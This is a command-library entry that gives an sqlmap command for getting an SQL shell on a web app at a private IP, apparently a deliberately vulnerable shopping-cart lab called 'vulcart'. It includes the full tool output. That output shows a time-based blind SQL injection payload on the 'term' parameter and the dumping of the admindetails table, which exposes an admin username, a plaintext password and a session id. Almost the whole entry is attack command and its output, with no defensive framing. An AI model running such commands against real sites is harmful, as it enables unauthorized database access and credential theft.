---
id: c55c5f6a-74b8-4064-9f70-033811e990ff
name: SQLMap Command to Get SQL Shell
type: command
executor: ''
data: sqlmap --dbms=mysql -u '192.168.43.68/vcart/search.php?term=' --sql-shell
output: "        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.2.7#stable}\n|_ -|\
  \ . [,]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\
  \n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual\
  \ consent is illegal. It is the end user's responsibility to obey all applicable\
  \ local, state and federal laws. Developers assume no liability and are not responsible\
  \ for any misuse or damage caused by this program\n\n[*] starting at 00:11:34\n\n\
  [00:11:34] [WARNING] provided value for parameter 'term' is empty. Please, always\
  \ use only valid parameter values so sqlmap could be able to run properly\n[00:11:34]\
  \ [INFO] testing connection to the target URL\nsqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'.\
  \ Do you want to follow? [Y/n] y\nsqlmap resumed the following injection point(s)\
  \ from stored session:\n---\nParameter: term (GET)\n    Type: AND/OR time-based\
  \ blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: term=%' AND\
  \ SLEEP(5) AND '%'='\n---\n[00:11:37] [INFO] testing MySQL\n[00:11:37] [INFO] confirming\
  \ MySQL\n[00:11:37] [INFO] the back-end DBMS is MySQL\nweb application technology:\
  \ Apache 2.4.41, PHP 7.1.32\nback-end DBMS: MySQL >= 5.0.0 (MariaDB fork)\n[00:11:37]\
  \ [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER\nsql-shell>\
  \ select * from admindetails;\n[00:11:51] [INFO] fetching SQL SELECT statement query\
  \ output: 'select * from admindetails'\n[00:11:51] [INFO] you did not provide the\
  \ fields in your query. sqlmap will retrieve the column names itself\n[00:11:51]\
  \ [WARNING] missing database parameter. sqlmap is going to use the current database\
  \ to enumerate table(s) columns\n[00:11:51] [INFO] fetching current database\n[00:11:51]\
  \ [WARNING] time-based comparison requires larger statistical model, please wait..............................\
  \ (done)                         \ndo you want sqlmap to try to optimize value(s)\
  \ for DBMS delay responses (option '--time-sec')? [Y/n] y\n[00:12:06] [WARNING]\
  \ it is very important to not stress the network connection during usage of time-based\
  \ payloads to prevent potential disruptions \n[00:12:26] [INFO] adjusting time delay\
  \ to 1 second due to good response times\nvulcart\n[00:13:06] [INFO] fetching columns\
  \ for table 'admindetails' in database 'vulcart'\n[00:13:06] [INFO] resumed: 3\n\
  [00:13:06] [INFO] resumed: username\n[00:13:06] [INFO] resumed: password\n[00:13:06]\
  \ [INFO] resumed: sessionid\n[00:13:06] [INFO] the query with expanded column name(s)\
  \ is: SELECT password, sessionid, username FROM admindetails\n[00:13:06] [INFO]\
  \ the SQL query provided has more than one field. sqlmap will now unpack it into\
  \ distinct queries to be able to retrieve the output even if we are going blind\n\
  [00:13:06] [INFO] retrieved: 1\n[00:13:08] [INFO] retrieved: admin\n[00:13:38] [INFO]\
  \ retrieved: wtdf9c7g5ks0l4v\n[00:15:39] [INFO] retrieved: admin\nselect * from\
  \ admindetails; [1]:\n[*] admin, wtdf9c7g5ks0l4v, admin\n"
created_at: '2020-08-19T19:16:15.164570+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SQLMap Command to Get SQL Shell

```bash
sqlmap --dbms=mysql -u '192.168.43.68/vcart/search.php?term=' --sql-shell
```

## Expected Output

```
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.7#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:11:34

[00:11:34] [WARNING] provided value for parameter 'term' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[00:11:34] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'. Do you want to follow? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: term (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: term=%' AND SLEEP(5) AND '%'='
---
[00:11:37] [INFO] testing MySQL
[00:11:37] [INFO] confirming MySQL
[00:11:37] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.1.32
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[00:11:37] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
sql-shell> select * from admindetails;
[00:11:51] [INFO] fetching SQL SELECT statement query output: 'select * from admindetails'
[00:11:51] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
[00:11:51] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
[00:11:51] [INFO] fetching current database
[00:11:51] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                         
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[00:12:06] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[00:12:26] [INFO] adjusting time delay to 1 second due to good response times
vulcart
[00:13:06] [INFO] fetching columns for table 'admindetails' in database 'vulcart'
[00:13:06] [INFO] resumed: 3
[00:13:06] [INFO] resumed: username
[00:13:06] [INFO] resumed: password
[00:13:06] [INFO] resumed: sessionid
[00:13:06] [INFO] the query with expanded column name(s) is: SELECT password, sessionid, username FROM admindetails
[00:13:06] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind
[00:13:06] [INFO] retrieved: 1
[00:13:08] [INFO] retrieved: admin
[00:13:38] [INFO] retrieved: wtdf9c7g5ks0l4v
[00:15:39] [INFO] retrieved: admin
select * from admindetails; [1]:
[*] admin, wtdf9c7g5ks0l4v, admin

```
